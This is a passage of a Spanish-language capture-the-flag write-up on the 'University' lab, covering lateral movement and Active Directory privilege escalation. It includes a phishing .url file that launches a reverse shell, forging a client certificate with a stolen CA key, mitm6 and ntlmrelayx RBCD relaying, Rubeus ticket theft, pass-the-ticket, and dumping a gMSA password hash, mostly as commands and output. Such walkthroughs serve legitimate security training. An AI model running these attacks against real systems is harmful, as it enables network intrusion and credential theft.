SSH         192.168.99.12   22     192.168.99.12    [+] wao:WebAO1337 (Pwn3d!) Linux - Shell access!
~~~

Debemos conectarnos a través de `proxychains` con el usuario `wao`

~~~ bash
proxychains -q ssh wao@192.168.99.12                                  
The authenticity of host '192.168.99.12 (192.168.99.12)' can't be established.
ED25519 key fingerprint is SHA256:z8L0+f0YSMRypoPvBj1IMW944a9RwwJXiKkrXdvipy4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.99.12' (ED25519) to the list of known hosts.
--------------------------[!]WARNING[!]-----------------------------
|This LAB is created for web app features testing purposes ONLY....|
|Please DO NOT leave any critical information while this machine is|
|       accessible by all the "Web Developers" as sudo users       |
--------------------------------------------------------------------
wao@192.168.99.12's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug  8 19:00:15 2025 from 192.168.99.1
wao@LAB-2:~$ hostname -I
192.168.99.12
~~~

Podemos asignar el siguiente valor a la variable de entorno `TERM` para poder hacer `Ctrl+L` y así limpiar la pantalla

~~~ bash
wao@LAB-2:~$ export TERM=xterm
~~~


## Shell as `root` - `LAB-2`

Si no confiamos en el comando anterior, comprobaremos por nuestra cuenta los privilegios a nivel de `sudoers` en esta máquina

~~~ bash
wao@LAB-2:~$ sudo -l
[sudo] password for wao: 
Matching Defaults entries for wao on LAB-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wao may run the following commands on LAB-2:
    (ALL : ALL) ALL
~~~

Así que directamente utilizaremos el siguiente comando para convertirnos en `root`

~~~ bash
wao@LAB-2:~$ sudo su
[sudo] password for wao: 
root@LAB-2:/home/wao# id
uid=0(root) gid=0(root) groups=0(root)
~~~



## Finding Lateral Movement Path

Nos encontramos en un punto donde solamente hemos comprometido un usuario dentro del dominio. Pudimos alcanzar algunos hosts internos activos, como `WS-3` y `LAB-2`, la siguiente imagen representa de forma gráfica el uso del proxy que establecimos con `chisel` y de qué forma alcanzamos la red interna

![[university-proxy-diagram.png]]

Analizando la información recolectada desde BloodHound, el camino para convertirnos en un usuario privilegiado no es del todo clara y lineal. 

### Path to `Content Evaluator`'s Member via Phishing

Inspeccionando a los usuarios y grupos del dominio, nos daremos cuenta de que existen grupos como `Content Evaluators` y `Research & Development`. Estos grupos tienen como miembros a usuarios que están vinculados en la web

![image-center](/assets/images/posts/university-bloodhound-3.png)
{: .align-center}

La descripción de este grupo nos da una pista que **esclarece un poco el camino** para continuar moviéndonos lateralmente a través del dominio.

![image-center](/assets/images/posts/university-bloodhound-4.png)
{: .align-center}

Si estos usuarios revisan el contenido de `Lectures`, podemos intentar realizar **enviar un archivo malicioso** que de alguna forma nos otorgue acceso como el usuario que lo revise


## Information Leakage

Si listamos los cursos en la ruta `/course`, veremos los detalles de cada curso, por ejemplo los profesores que los imparten

![image-center](/assets/images/posts/university-web-9.png)
{: .align-center}

Si hacemos clic en el nombre del profesor, veremos su perfil, y dentro del perfil veremos su nombre de usuario y su email

![image-center](/assets/images/posts/university-web-10.png)
{: .align-center}


## Generating X.509 Certificate

Recordemos la funcionalidad para iniciar sesión con un certificado en la web. Intentaremos generar un certificado válido para la profesora `nya` (porque es el primer usuario que vi) e iniciar sesión en su cuenta.

> Anteriormente creamos un certificado válido y solamente necesitábamos nuestro **usuario y contraseña**
{: .notice--warning}

Descargaremos los archivos necesarios para generar un certificado firmado que se encuentran dentro de la carpeta `CA` dentro de `C:\Web\University`

~~~ powershell
evil-winrm-py PS C:\Users\WAO\Documents> cd C:\Web\University
evil-winrm-py PS C:\Web\University> cd CA
evil-winrm-py PS C:\Web\University\CA> dir

    Directory: C:\Web\University\CA

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/15/2024   5:51 AM           1399 rootCA.crt
-a----        2/15/2024   5:48 AM           1704 rootCA.key
-a----        2/25/2024   5:41 PM             42 rootCA.srl

evil-winrm-py PS C:\Web\University\CA> download rootCA.crt .
evil-winrm-py PS C:\Web\University\CA> download rootCA.key .
~~~

### Certificate Signing Function

Existe un script `certificate_utils.py` que es utilizado para interactuar con los certificados y las firmas digitales

~~~ powershell
evil-winrm-py PS C:\Web\University> type .\University\certificate_utils.py
~~~

Dentro de la función `generate_signed_cert()` vemos de qué manera se efectúa la firma, podemos imitar el comando para firmar el certificado por nuestra cuenta

~~~ python
def generate_signed_cert(request, user):
    command = r'"C:\\Program Files\\openssl-3.0\\x64\\bin\\openssl.exe" x509 -req -in "{}" -CA "{}" -CAkey "{}" -CAcreateserial'.format(user.csr.path, rooCA_Cert, rooCA_PrivKey)
    output = subprocess.check_output(command, shell=True).decode()
    # Base64 encode the content of the file
    encoded_output = b64encode(output.encode()).decode()
    response = HttpResponse(content_type='application/x-x509-ca-cert')
    # Set the content of the file as a cookie
    response.set_cookie('PSC', encoded_output)
    response['Content-Disposition'] = 'attachment; filename="signed-cert.pem"'
    response.write(output)
    return response
~~~
<br>
Comenzaremos por generar un archivo `.csr` como lo hicimos al principio, sin embargo, ahora necesitamos los datos reales de `nya`, tanto `username` como `email`

~~~ bash
openssl req -newkey rsa:2048 -keyout PK.key -out nya.csr   
...
...
...
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
...
...
...
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:nya 
Email Address []:nya.laracrof@skype.com

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
~~~

### Certificate + Private Key (`.pem`)

No necesitamos que el servidor firme el certificado porque ya tenemos los archivos necesarios. Firmaremos el certificado y lo exportaremos en un archivo `.pem`

~~~ bash
openssl x509 -req -in nya.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial > nya.pem
Certificate request self-signature ok
subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = nya, emailAddress = nya.laracrof@skype.com
~~~


## Web Session as Professor

Ahora podemos utilizar este archivo de clave privada para iniciar sesión como la profesora `nya`

![image-center](/assets/images/posts/university-web-11.png)
{: .align-center}

Desde la sesión de `nya`, como tenemos una cuenta de `Professor`, podemos administrar los cursos

![image-center](/assets/images/posts/university-web-12.png)
{: .align-center}

Al ir a los detalles de un curso, en el final podremos agregar una nueva lectura

![image-center](/assets/images/posts/university-web-13.png)
{: .align-center}

Al hacer clic en `Add a new lecture`, veremos la siguiente web donde se nos explica el proceso

![image-center](/assets/images/posts/university-web-14.png)
{: .align-center}

Podemos descargar un archivo `Perfect-Lecture-Sample.zip`, y se nos detalla que contiene archivos de ejemplo que podemos utilizar

~~~ bash
wget http://university.htb/static/assets/uploads/lectures/Perfect-Lecture-Sample.zip

# Descomprimimos
unzip Perfect-Lecture-Sample.zip 
Archive:  Perfect-Lecture-Sample.zip
  inflating: Lecture.docx            
  inflating: Lecture.pdf             
  inflating: Lecture.pptx            
 extracting: Reference-1.url         
  inflating: Reference-2.url         
  inflating: Reference-3.url
~~~

El servicio web acepta todos estos tipos de archivo, si le echamos un vistazo a un archivo `.url`

> Los archivos con extensión `.url` son archivos de acceso directo a páginas web, también conocidos como "enlaces web" o "accesos directos a URL".
{: .notice--info}

~~~ bash
cat Reference-1.url 

[InternetShortcut]
URL=http://site1.reference.com
IDList=
~~~


## Phishing Attack

Crearemos un archivo `.url` malicioso que se encargue de hacer referencia a un recurso dentro del DC, y que éste nos envíe una consola de `powershell`


Subiremos el archivo malicioso a la máquina

~~~ bash
evil-winrm-py PS C:\Programdata> upload rev.bat .
~~~

Le asignaremos control total sobre el archivo `rev.ps1` a todos los usuarios, esto lo hacemos para evitar conflictos de permisos

~~~ bash
evil-winrm-py PS C:\Programdata> icacls.exe rev.bat /grant Everyone:F
processed file: rev.bat
Successfully processed 1 files; Failed processing 0 files
~~~

El siguiente archivo hace uso del esquema `file://` para cargar el recurso malicioso.

> La expresión `file://` es un **esquema de URL** que se utiliza para acceder a archivos locales en tu computadora o dispositivo. Es parte del formato estándar de URLs
{: .notice--info}

~~~ bash
[InternetShortcut]

URL=file://C:\ProgramData\rev.bat
IDList=
~~~

Generaremos un archivo comprimido que contenga el archivo `Evil.url`

~~~ bash
zip evil.zip Evil.url
  adding: Evil.url (stored 0%)
~~~

### Exporting Public GPG/PGP Key

Si intentamos cargar directamente nuestro archivo malicioso, nos arrojará un error. Necesitaremos cambiar la clave pública de esta cuenta para poder subir el archivo `.zip` malicioso. Nos dirigiremos a `Change Public Key`

![image-center](/assets/images/posts/university-pgp.png)
{: .align-center}

Dentro de esta sección nos proporcionan un comando a seguir para generar una clave pública `gpg`

> Una clave pública `GPG/PGP` es una parte de un par de claves criptográficas utilizada para **cifrar y firmar datos digitalmente.**
{: .notice--info}

![image-center](/assets/images/posts/university-pgp-2.png)
{: .align-center}

Generaremos una nueva clave pública la cual necesitaremos para posteriormente firmar el archivo que subiremos a la web

~~~ bash
gpg --generate-key
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: nya.laracrof
Email address: nya.laracrof@skype.com
You selected this USER-ID:
    "nya.laracrof <nya.laracrof@skype.com>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? o
~~~

> Se abrirá un recuadro donde debemos crear un `passphrase`, solamente **será necesaria esta contraseña para firmar el archivo** que debemos cargar en la web (`.zip`).
{: .notice--danger}

~~~ bash
...
...
...
pub   rsa3072 2025-08-09 [SC] [expires: 2027-08-09]
      356CBF4646362FF120D0C69FBC425D6822C8EBA1
uid                      nya.laracrof <nya.laracrof@skype.com>
sub   rsa3072 2025-08-09 [E] [expires: 2027-08-09]
~~~

Ahora procederemos con exportar la clave pública en un archivo `.asc` que enviaremos a la web

> Una archivo `.asc` en este contexto es una archivo cifrado con [PGP (Pretty Good Privacy)](https://www.openpgp.org/), usado para firmar digitalmente o cifrar datos.
{: .notice--info}

~~~ bash
gpg --export -a nya > nya-public-key.asc
~~~

Cargaremos el archivo `.asc` en la sección `Change Public Key` y haremos clic en `Submit`

![image-center](/assets/images/posts/university-pgp-3.png)
{: .align-center}

### Digital Signature

Con la clave pública preparada, firmaremos el archivo con el comando proporcionado (te solicitará la contraseña que creaste para la clave pública), se generará un archivo `.sig` que contiene la firma digital

> Un archivo `.sig` es un archivo de firma digital que se utiliza para verificar la autenticidad e integridad de otro archivo. Generalmente, se crea utilizando un algoritmo de firma digital y se asocia con el archivo original para garantizar que no ha sido alterado.
{: .notice--info}

~~~ bash
gpg -u nya --detach-sign evil.zip

ls
evil.zip  evil.zip.sig
~~~

Iniciaremos un listener en la máquina `LAB-2` para esperar a recibir una conexión (no funcionó para mí intentar reenviar el tráfico con `socat`)

~~~ bash
root@LAB-2:/home/wao# nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
~~~

Cargaremos los archivos en la web de la siguiente manera, es obligatorio especificar un nombre

![image-center](/assets/images/posts/university-sign.png)
{: .align-center}

El siguiente mensaje indica que todo ha funcionado, ahora debemos esperar

![image-center](/assets/images/posts/university-sign-2.png)
{: .align-center}

> Recomiendo encarecidamente interceptar esta solicitud con `Burpsuite` para poder replicarla desde el `Repeater` por algunos problemas que experimenté con la Reverse Shell
{: .notice--danger}


## Shell as `Martin.T` (`WS-2`)

Al cabo de un momento recibiremos una consola de `powershell` como el usuario `martin.t`

~~~ bash
Connection from 192.168.99.2 49765 received!

PS C:\Windows\system32> whoami
university\martin.t
~~~

Ya podremos ver la flag del usuario sin privilegios

~~~ bash
PS C:\Users\Martin.T\Desktop> type user.txt 
ef0...
~~~
<br>


# Escalada de Privilegios
---
## Abusing RBCD (Resource-Based Constrained Delegation)  + NTLM Relay 

En `kerberos`, el término de delegación consiste en permitir a un servicio actuar en nombre de otro usuario para acceder a otros servicios dentro de una red.

> Cuando un usuario accede a un servicio que requiere delegación, éste solicita al KDC un ticket de servicio (`Ticket Granting Service`) en nombre del usuario que desea autenticarse.
{: .notice--info}

El equipo `WS-3` tiene añadido el atributo `Allows Unconstrained Delegation`, más bien `msDS-AllowedToActOnBehalfOfOtherIdentity`. Esto le da la capacidad de impersonar a un usuario en este equipo.
<br>
Podemos intentar capturar autenticación NTLM y redirigirla al servicio LDAP del DC, como se describe en el escenario `3` del siguiente artículo ([`Delegating Like a Boss`](https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/))

![image-center](/assets/images/posts/university-bloodhound-5.png)
{: .align-center}

 Notaremos que la máquina `LAB-2` tiene instalado `ntlmrelayx.py`, utilizaremos esta herramienta junto a `mitm6.py` para envenenar las consultas DNS 

~~~ bash
root@LAB-2:/home/wao# which ntlmrelayx.py
/usr/local/bin/ntlmrelayx.py
~~~

> `MachineAccountQuota` es un atributo a nivel de dominio que por defecto permite a cualquier usuario no privilegiado en Active Directory añadir hasta `10` cuentas de equipo.
{: .notice--info}

Crearemos una computadora que será quién va a impersonar al usuario `Administrator` dentro de `WS-3`

~~~ bash
addcomputer.py -computer-name 'incommatose' -computer-pass 'Password123!' -dc-host dc.university.htb university.htb/wao:WebAO1337
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account andr3w$ with password Password123!
~~~

Copiaremos [`mitm6.py`](https://raw.githubusercontent.com/dirkjanm/mitm6/refs/heads/master/mitm6/mitm6.py) en la máquina `LAB-2` e iniciaremos el envenenamiento por la interfaz `eth0` al dominio

~~~ bash
root@LAB-2:~# python3 mitm6.py -i eth0 -d university.htb

/usr/local/lib/python3.6/dist-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.
  import cryptography
:0: UserWarning: You do not have a working installation of the service_identity module: 'No module named 'service_identity''.  Please install it from <https://pypi.python.org/pypi/service_identity> and make sure all of its dependencies are satisfied.  Without the service_identity module, Twisted can perform only rudimentary TLS client hostname verification.  Many valid certificate/hostname mappings may be rejected.
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:15:5d:05:80:07]
IPv4 address: 192.168.99.12
IPv6 address: fe80::215:5dff:fe05:8007
DNS local search domain: university.htb
DNS allowlist: university.htb
WARNING: No route found for IPv6 destination fe80::47c0:fbc9:2d7b:e4bb (no default route?)
WARNING: No route found for IPv6 destination fe80::349:6988:18c6:65c6 (no default route?)
WARNING: more No route found for IPv6 destination fe80::349:6988:18c6:65c6 (no default route?)
~~~

Iniciaremos la herramienta `ntlmrelayx.py` que configure RBCD a nuestra cuenta de equipo que creamos anteriormente. Capturaremos el tráfico envenenado y lo enviaremos al DC

~~~ bash
root@LAB-2:/home/wao# ntlmrelayx.py -6 -t ldap://192.168.99.1 --delegate-access --escalate-user incommatose -wh wpad -ts --no-da

Impacket v0.11.0 - Copyright 2023 Fortra

[2025-08-10 01:39:17] [*] Protocol Client IMAPS loaded..
[2025-08-10 01:39:17] [*] Protocol Client IMAP loaded..
[2025-08-10 01:39:17] [*] Protocol Client LDAP loaded..
[2025-08-10 01:39:17] [*] Protocol Client LDAPS loaded..
[2025-08-10 01:39:17] [*] Protocol Client RPC loaded..
[2025-08-10 01:39:17] [*] Protocol Client HTTP loaded..
[2025-08-10 01:39:17] [*] Protocol Client HTTPS loaded..
/usr/local/lib/python3.6/dist-packages/OpenSSL/_util.py:6: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.
  from cryptography.hazmat.bindings.openssl.binding import Binding
[2025-08-10 01:39:17] [*] Protocol Client MSSQL loaded..
[2025-08-10 01:39:17] [*] Protocol Client DCSYNC loaded..
[2025-08-10 01:39:17] [*] Protocol Client SMB loaded..
[2025-08-10 01:39:17] [*] Protocol Client SMTP loaded..
[2025-08-10 01:39:18] [*] Running in relay mode to single host
[2025-08-10 01:39:18] [*] Setting up SMB Server
[2025-08-10 01:39:18] [*] Setting up HTTP Server on port 80
[2025-08-10 01:39:18] [*] Setting up WCF Server
[2025-08-10 01:39:18] [*] Setting up RAW Server on port 6666

[2025-08-10 01:39:18] [*] Servers started, waiting for connections
~~~

- `-6`: Habilitar IPv6, con el propósito de forzar autenticación NTLM por `IPv6`.
- `-t ldap://192.168.99.1`: Dirección IP interna del DC, será donde enviaremos la autenticación.
- `--delegate-access`: Usar la retransmisión para delegar el acceso en `WS-3` a la cuenta especificada.
- `--escalate-user incommatose`: Usar la cuenta de equipo para la delegación.
- `-wh wpad`: Permite servir el archivo WPAD, necesario para la autenticación (el nombre sólo es referencial).
- `--no-da`: No crear una nueva cuenta de equipo a nivel de dominio
- `-ts`: Incluir `timestamp`.

### Trigger NTLM Relay

Necesitamos activar la autenticación, existen algunas formas que se detallan en el artículo anterior. Sin embargo, existe una forma de iniciar el ataque a través de abrir la sección de `Windows Update` desde una sesión GUI (que `wao` no posee, es por eso que no intentamos iniciar autenticación con su cuenta).

Los siguientes comandos se encargan de consultar el servicio `Windows Update` y se encarga de iniciarlo

~~~ bash
PS C:\Windows\system32> sc.exe query wuauserv

SERVICE_NAME: wuauserv 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        
PS C:\Windows\system32> sc.exe start wuauserv

SERVICE_NAME: wuauserv 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 860
        FLAGS              :
~~~

Cuando se inicie la ventana, se intentará conectar a los servidores de `Microsoft`. Cuando no pueda conectarse a internet, se buscará WPAD (`Web Proxy Auto-Detect`) y enviará un mensaje de difusión (`broadcast`) que contaminaremos desde `LAB-2`.

Ejecutaremos alguno de los siguientes comandos unas cuantas veces para forzar la autenticación NTLM desde la máquina víctima (`WS-3`)

~~~ bash
PS C:\Windows\system32> Start-Process -FilePath 'ms-settings:windowsupdate'

# Alternative
PS C:\Windows\system32> Start-Process -FilePath 'ms-settings:activation'
~~~

Veremos cómo la autenticación hacia el servidor LDAP (DC) se efectúa correctamente, modificando los derechos de delegación sobre `incommatose$`

~~~ bash
[2025-08-10 19:40:27] [*] Servers started, waiting for connections
[2025-08-10 19:43:14] [*] HTTPD(80): Client requested path: /wpad.dat
[2025-08-10 19:44:14] [*] HTTPD(80): Client requested path: /wpad.dat
[2025-08-10 19:44:14] [*] HTTPD(80): Serving PAC file to client ::ffff:192.168.99.2
[2025-08-10 19:44:18] [*] HTTPD(80): Connection from ::ffff:192.168.99.2 controlled, attacking target ldap://192.168.99.1
[2025-08-10 19:44:18] [*] HTTPD(80): Authenticating against ldap://192.168.99.1 as UNIVERSITY/WS-3$ SUCCEED
[2025-08-10 19:44:18] [*] Enumerating relayed user's privileges. This may take a while on large domains
[2025-08-10 19:44:18] [*] HTTPD(80): Connection from ::ffff:192.168.99.2 controlled, but there are no more targets left!
[2025-08-10 19:44:18] [*] HTTPD(80): Connection from ::ffff:192.168.99.2 controlled, but there are no more targets left!
[2025-08-10 19:44:18] [*] Delegation rights modified succesfully!
[2025-08-10 19:44:18] [*] incommatose$ can now impersonate users on WS-3$ via S4U2Proxy
~~~

Ahora la cuenta de equipo `incommatose$` tiene permisos para suplantar a un usuario dentro de `WS-3`, solicitaremos un TGS para el usuario `Administrator`. Utilizamos `HTTP` en el SPN porque nos autenticaremos vía WinRM, y este protocolo usa HTTP

~~~ bash
getST.py -spn HTTP/WS-3.university.htb university.htb/'incommatose$':'Password123!' -impersonate Administrator -dc-ip 10.10.11.39

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HTTP_WS-3.university.htb@UNIVERSITY.HTB.ccache
~~~


## Kerberos Client Setup

Para utilizar el ticket como autenticación en `WS-3`, debemos definir la configuración de `kerberos` para que nuestra máquina pueda comunicarse con el `KDC` (Key Distribution Center), basta con poseer esta configuración básica

~~~ bash
[realms]
UNIVERSITY.HTB = {
	kdc = DC.university.htb
}
~~~

Como emplearemos autenticación `kerberos` para conectarnos a `WS-3`, necesitaremos agregar el nombre de éste al archivo `/etc/hosts`

~~~ bash
echo "192.168.99.2 WS-3.university.htb" >> /etc/hosts
~~~


## Shell as `Administrator` - `WS-3`

Cargaremos el ticket en la variable `KRB5CCNAME` y utilizaremos `evil-winrm` en conjunto con el proxy que nos permite llegar hasta `WS-3.university.htb`

~~~ bash
KRB5CCNAME=Administrator@HTTP_WS-3.university.htb@UNIVERSITY.HTB.ccache proxychains -q evil-winrm -r university.htb -i WS-3.university.htb

*Evil-WinRM* PS C:\Users\Administrator.UNIVERSITY\Documents> whoami
university\administrator
~~~


## Ticket Extraction - `Rubeus.exe`

En un proceso de autenticación Kerberos estándar, cuando un principal accede a un servicio habilitado para Kerberos, presenta un boleto de servicio al host del servicio (una computadora o cuenta de servicio).

Si un servicio es confiable en cuanto a delegación sin restricciones (`Unconstrained Delegation`), cuando un usuario se autentica, envía su TGT, y el servicio puede almacenarlo en la memoria.

Utilizaremos [Rubeus](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Rubeus.exe) para buscar TGTs, extraerlos y posteriormente convertirlos a unas credenciales en caché (`.ccache`)

~~~ bash
evil-winrm-py PS C:\Programdata> upload Rubeus.exe .
~~~

Extraeremos tickets almacenados en la memoria, obtendremos un TGT del usuario `Rose.L` codificado en `base64`

~~~ bash
*Evil-WinRM* PS C:\Programdata> .\Rubeus.exe monitor /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: TGT Monitoring
[*] Monitoring every 60 seconds for new TGTs


[*] 8/11/2025 12:00:26 AM UTC - Found new TGT:

  User                  :  Rose.L@UNIVERSITY.HTB
  StartTime             :  8/10/2025 4:58:30 PM
  EndTime               :  8/11/2025 2:56:59 AM
  RenewTill             :  8/17/2025 4:56:59 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFejCCBXagAwIBBaEDAgEWooIEezCCBHdhggRzMIIEb6ADAgEFoRAbDlVOSVZFUlNJVFkuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5VTklWRVJTSVRZLkhUQqOCBC8wggQroAMCARKhAwIBAqKCBB0EggQZIE0DrRGgmCwkr6yDujEm+yixmROYu1+sm5W6sK2VBrz6nkv+3GuZI404xcmVO8UnnUSAnUQrxMJ/NY6KxXr2XP8BcjNIRojiJOAvTgz3TsM8kZQ8B7xDE+Yb6pNC1cW0LkFAR/Ny9vXt4+iis1cQ83q19z4nEhW5FHeOOUj7MyTnsePx0BgTbmEDwozw0HLGw/cfR9AXn1TUpR1xwOYPOmoJlpThdFkhXGxKUz63B9Kn5HYhsgxQBHTmdv5JpnRdE4/rboGwAkZ2nb6uEEh5vNCOu09awJ1EQ06r3JaYLbZOTV0yk1rKkkkhZnIgj3r8+Q9dR+uhImijnnkyfbQQFzmignRA8RBnhaI3JDH1S8BE4DFi/Ck7VBD9x5RuyNBZlWa2WZg0UBuOvS+uGdgeEwvMGzJ+u3cjWD8OO2kjXBuu/29KIUQUa3z1UP36rUJ2P3plF1Y5q2+MK1gPe62ag2r1SETNLBLaB/LwUDyYQ241LztQJc7tQok8kyKRK4J7prfPhgyh9GSJ04houVKUJ6Z3Ln++0Az0Rb+7eUXqsAu3A4T2C+y7dMVl7PWeRhZQgkgQS0ORTLdqFownvHSzJ1sJlEqkpSeeCAKiERb3cP+QqMszYc1ISUlU3VUuW1LIyihccoJtzzWk0qwriQsMxw0nCB7875+Ic2xqO7olYr9ra6TohRjwcO8HAavMs/XaJ1/fVba8/R8QETu1RbixdraC+AYrP0aYEPhTHPJOyykNDN4nMgaluHS1sDJNfGP+V00GXcQvOD/UnfnoUbCWmz9MZMZm5EY+kHFvxn6Z93vAqjZ0UJAineM3zx/B8FvRz74z6gg3UHDPgdEDX0CS6bjh9cSw0R7qH50x4VOlUEA3fgfUb1T33VVN7BxFSYZ+IkBnMP0uf4U9LytltdqAd4H8dQw21qHg7x/hmtwIdk0J79NaP7g6Ul+srL4ehsfoMnJcUjWjIpcWU3We5NyAWlt1cvHZ0IjC5VZqN46k9TL7ED3MxQbMHRb82/OemrgtpyrK7trlY2jKO9aTtgaLRlI0fLX7PeMY7kj7eVqErFzdccqdu0FnvLsuKUSnh/Zna+7PoGXdJ5yXNSLETet4PFVg8acMn7Txm9BTuG58T6ZP1vWewzHiZ5GuqpHed2xCrofgVwNLj5WeV2QYhd7R+NFsRRYqs7NDkNAqMaahkxoO+tzNAt+NPDu/VPU8kxaCHJE2fD63ar5dA2yPycJhBRoINzYMtw5GOBeILaiS9eALuiEhvy/0kGY04tgKP4BT+YAG9VIzBxf/K2Dgc0jTm69244jJf1iu744pNODfUeURihizfYh2tcaqUBe7U/pR4ZJRahv2VoJsZtF7WrX5a1OyZgf3Q6sDCy+iDRAWKhFhPrM/7hCGpX+jgeowgeegAwIBAKKB3wSB3H2B2TCB1qCB0zCB0DCBzaArMCmgAwIBEqEiBCC97TlkU8X4wcCqDc//9lRYmMuE6OVdrqCyFze5d8CNoKEQGw5VTklWRVJTSVRZLkhUQqITMBGgAwIBAaEKMAgbBlJvc2UuTKMHAwUAYKEAAKURGA8yMDI1MDgxMDIzNTgzMFqmERgPMjAyNTA4MTEwOTU2NTlapxEYDzIwMjUwODE3MjM1NjU5WqgQGw5VTklWRVJTSVRZLkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOVU5JVkVSU0lUWS5IVEI=
~~~

Guardaremos el contenido del ticket en un archivo `.kirbi`, debemos decodificarlo desde `base64`

~~~ bash
 echo "doIFejCCBXag..." | base64 -d > Rose.L.kirbi
~~~

Utilizaremos la herramienta `ticketConverter` para almacenarlo en unas credenciales en caché

~~~ bash
ticketConverter.py Rose.L.kirbi Rose.L.ccache
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
~~~


## PassTheTicket

Ya podremos utilizar el ticket a modo de autenticación en el DC, solamente debemos cargarlo en la variable `KRB5CCNAME`

~~~ bash
KRB5CCNAME=Rose.L.ccache evil-winrm -i DC.university.htb -r university.htb
~~~


## Abusing ACL Rights - `ReadGMSAPassword`

La cuenta `Rose.L` forma parte del grupo `Account Operators`, esto otorga control sobre muchos objetos dentro del dominio, como podemos ver en la siguiente imagen

![image-center](/assets/images/posts/university-bloodhound-6.png)
{: .align-center}

Cargaremos el ticket de `Rose.L` y extraeremos el hash NT de esta cuenta de servicio

~~~ bash
KRB5CCNAME=Rose.L.ccache bloodyAD --host DC.university.htb -d university.htb --dc-ip 10.10.11.39 -u 'Rose.L' -k get object 'GMSA-PClient01$' --attr msDS-ManagedPassword

distinguishedName: CN=GMSA-PClient01,CN=Managed Service Accounts,DC=university,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:6d364c74ff11b3bce0bc41c097bf55c8
msDS-ManagedPassword.B64ENCODED: zLjGc1I1ZK86ZCIy3rKHF7csnPBKws67VjJN/c8WUOwbXpYt6KZKNf9Ypf7LlcxhZ+V7LoIdmcue3LRdagSaV27sEKtkDiASoRIDYMZDfB9Qm7CyIuXiwunelrEA29MgjVWMffy3XieA6LmRWQAoeH9lREa0P2UbtLaD3YVmx1ThB3ROcokBCdzYtE7CHOfk3zUgp8eo2xwVVID0JTWI4dkyfgtEWp0C20Y/K4wOOB6K2VetJm39ZJVkTlKyl2SUzzSIWd1+rFG5ppE6Q0d9MNXd8bcd5Pa51kS3o8jL5XOhZ4Uxs+Q+dX1Kg0ru+Q/Cdh0aQzY1KmYf+WuQGiVZ+Q==
~~~


## Abusing RBCD

La cuenta de servicio `GMSA-PCCLIENT$` tiene añadido el atributo `msds-AllowedToActOnBehalfOfOtherIdentity`, esto le permite actuar en nombre de cualquier cuenta dentro del DC, solicitaremos un ticket de servicio suplantando el usuario `Administrator`

~~~ bash
getST.py -spn CIFS/DC.university.htb university.htb/'GMSA-PClient01$' -hashes :6d364c74ff11b3bce0bc41c097bf55c8 -impersonate Administrator -dc-ip 10.10.11.39 

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
